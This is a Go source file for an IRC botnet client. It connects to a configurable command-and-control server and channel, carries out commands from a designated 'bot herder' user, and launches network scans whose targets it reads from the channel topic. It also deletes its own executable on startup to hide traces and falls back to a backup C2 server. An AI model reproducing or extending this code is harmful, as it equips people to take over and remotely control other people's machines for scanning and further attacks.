package main

import (
	"bufio"
	"fmt"
	"net/textproto"
	"os"
	"runtime"
	"strings"

	lib "bot/internal"
)

const (
	IRC_SERVER        = "" //Config IRC server and port here. //ip:port //"127.0.0.1:6667"
	IRC_BACKUP_SERVER = "" //Config like main server, if you didn't have it just leave it blank.
	IRC_CHANNEL       = "" //Config channel here. //"#Example"
	IRC_CHANNEL_KEY   = "" //Config channel key here, if you didn't have it just leave it blank.
	IRC_USERNAME      = "" //Config your IRC username here, for access to your bot commands.
	IRC_BOT_TAG       = "" //Config your bot tag here. //"EXAMPLE" //[EXAMPLE][A][1234567]
)

func run(server string) error {
	conn := lib.Conn(server)
	tp := textproto.NewReader(bufio.NewReader(conn))

	b := &lib.Bot{
		IRC:       conn,
		CPU:       runtime.NumCPU(),
		Channel:   IRC_CHANNEL,
		ChanKey:   IRC_CHANNEL_KEY,
		BotTag:    IRC_BOT_TAG,
		BotHerder: IRC_USERNAME,
	}
	b.Join()

	for {
		ircRead, err := tp.ReadLine()
		if err != nil {
			return err
		}
		lib.BotReader = &ircRead

		go func() {
			if lib.Find(ircRead, "PING :") {
				b.Send("PONG " + lib.Recv(ircRead, 1))
			}
		}()

		/*
			Check is user modes and join IRC channel
		*/
		if lib.Find(ircRead, "+i") || lib.Find(ircRead, "+w") || lib.Find(ircRead, "+x") {
			b.Send(fmt.Sprint("JOIN " + IRC_CHANNEL + IRC_CHANNEL_KEY))
		}

		go func() {
			if b.AccessPerms() && lib.Find(ircRead, IRC_USERNAME) {
				if _, arg := lib.SetupCaller(); arg {
					if exeCall, exeKey := b.ExecuteCaller(); exeKey {
						lib.FunctionCaller(exeCall)
					}
				}
			}
		}()

		/*
			Auto scan recevier from IRC channel topic.
		*/
		if lib.Find(ircRead, "?autoscan") && lib.Find(ircRead, "["+IRC_USERNAME+"]") {
			for i := 4; i <= 7; i++ {
				lib.ChannelTopic = append(lib.ChannelTopic, lib.SetupComd(i, ":"), " ")
			}
			mergeTopic := strings.Join(lib.ChannelTopic[0:8], "")
			lib.TopicReader = &mergeTopic
			lib.FunctionCaller(b.Scanner)
		}
	}
}

func main() {
	os.Remove(os.Args[0])
	if run(IRC_SERVER) != nil {
		if IRC_BACKUP_SERVER == "" {
			lib.Kill()
		}
		for {
			if run(IRC_BACKUP_SERVER) == nil {
				break
			}
		}
	}
}
